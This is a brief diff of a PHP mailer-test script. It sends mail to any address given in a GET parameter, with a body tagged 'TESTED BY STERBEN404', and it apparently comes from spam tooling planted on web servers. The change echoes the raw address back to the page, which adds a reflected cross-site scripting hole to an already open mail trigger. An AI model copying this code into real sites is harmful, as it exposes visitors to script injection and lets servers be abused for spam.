@@ -6,7 +6,7 @@
 if (isset($_GET['mail'])) {
 	$mail = $_GET['mail'];
 	if (mail($mail,$_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'],"MAILER TESTED BY STERBEN404")){
-		echo("Mail Send!!"); 
+		echo("Mail Send --> ".$mail."!!"); 
 	}
 	else { 
 		echo("Not support for mailer");
